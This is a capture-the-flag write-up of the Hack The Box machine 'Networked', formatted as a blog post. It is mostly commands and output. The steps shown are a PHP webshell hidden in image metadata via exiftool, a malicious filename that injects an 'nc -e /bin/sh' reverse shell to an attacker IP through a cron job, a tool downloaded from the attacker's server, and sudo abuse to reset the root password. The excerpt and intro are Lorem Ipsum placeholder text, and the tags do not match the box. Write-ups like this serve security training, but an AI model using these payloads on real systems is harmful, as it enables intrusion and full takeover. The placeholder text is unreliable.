---
layout: single
title: Networked - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-10-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-networked/networked_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-networked/networked_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. nmap -Pn -sC -sV -O 10.10.10.146
   Open ports: 22, 80, 443

2. dirb http://10.10.10.146
   Detects /backup/ download .tar and extract the .php-files

3. Upload a file http://10.10.10.146/upload.php
   Upload.php shows;
   - the uploaded file will change name (ip_address.png ex. 10_10_14_28.png)
   - must be .jpg, .jpeg, .png or .gif
   - size must be smaller than 60000 byte
   - successful upload will be moved to /var/www/html/uploads/ (http://10.10.10.146/uploads/10_10_14_28.png)

   Lib.php shows:
   - mime type will be double checked to pervent mime-switching through burp

   Create a webshell using exiftoool:
   exiftool -DocumentName="<h1>Player Three Has Entered The Game<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" image.png
   Rename the file to .php.png to force php execution: mv image.png webshell.php.png

4. Enum box through webshell
   http://10.10.10.146/uploads/10_10_14_15.php.png?cmd=whoami   (apache)
   http://10.10.10.146/uploads/10_10_14_15.php.png?cmd=ls%20-al%20/home/guly/

   total 28
   drwxr-xr-x. 2 guly guly 159 Jul  9 13:40 .
   drwxr-xr-x. 3 root root  18 Jul  2 13:27 ..
   lrwxrwxrwx. 1 root root   9 Jul  2 13:35 .bash_history -> /dev/null
   -rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
   -rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
   -rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
   -rw-------  1 guly guly 639 Jul  9 13:40 .viminfo
   -r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
   -rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
   -r--------. 1 guly guly  33 Oct 30  2018 user.txt

   We don't have priv to read user.txt yet, need to escalate.

5. Exploiting check_attack.php
   check_attack.php has a cronjob that will remove new files from /var/www/html/uploads, using the syntax "rm -f /var/www/html/uploads/".
   Exploit this by creating reverse bash shell starting the name with ;
   (touch /var/www/html/uploads/";nc -e /bin/sh 10.10.14.15 4488")
   http://10.10.10.146/uploads/10_10_14_15.php.png?cmd=touch%20/var/www/html/uploads/%22;nc%20-e%20/bin/sh%2010.10.14.15%204488%22

6. Start netcat and wait for the cronjob to trigger your reverse shell
   root@p3:/opt/htb/machines/networked# nc -lnvp 4488
   listening on [any] 4488 ...
   connect to [10.10.14.15] from (UNKNOWN) [10.10.10.146] 36284

   ls
   check_attack.php
   crontab.guly
   user.txt

   whoami
   guly

   cat user.txt
   526****************

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Upgrade rev shell (tty0) to a better one for ease of use and better information.
    python -c 'import pty;pty.spawn("/bin/bash")'
    ctrl + z
    stty raw -echo
    fg
    <ENTER>
    <ENTER>
    export TERM=xterm

2. Download lse.sh to the victim and scan for vulns. wget is unable so we use curl instead
    root@p3:/opt/scanners/linux# python3 -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

    [guly@networked shm]$ curl http://10.10.14.15:8080/lse.sh --output lse.sh
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100 31737  100 31737    0     0   292k      0 --:--:-- --:--:-- --:--:--  295k
    [guly@networked shm]$ ls -al
    total 32
    drwxrwxrwt  2 root root    60 Sep 20 14:54 .
    drwxr-xr-x 20 root root  3200 Sep 19 21:01 ..
    -rw-rw-r--  1 guly guly 31737 Sep 20 14:54 lse.sh

3. Give +x and scan the system
    chmod +x lse.sh
    ./lse.sh -l1

4. The script changename.sh is executable by gully and has root privs.
    User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh

5. Looking in the script, we can see that it only accepts input according to the regexp:
    regexp="^[a-zA-Z0-9_\ /-]+$"

      Looking at the regexp we are only allowed to input a-z, 0-9, "-" and " ".
      Use https://regex101.com/ to test acceptable inputs

6. Run the script and change the root password.
    [guly@networked sbin]$ sudo ./changename.sh
    interface NAME:
    sudo passwd
    interface PROXY_METHOD:
    asd
    interface BROWSER_ONLY:
    asd
    interface BOOTPROTO:
    asd
    Changing password for user root.
    New password:
    Retype new password:
    passwd: all authentication tokens updated successfully.
    Changing password for user root.

    [guly@networked sbin]$ su
    Password:

    [root@networked sbin]# whoami
    root

    [root@networked sbin]# cat /root/root.txt
    0a8*****************************
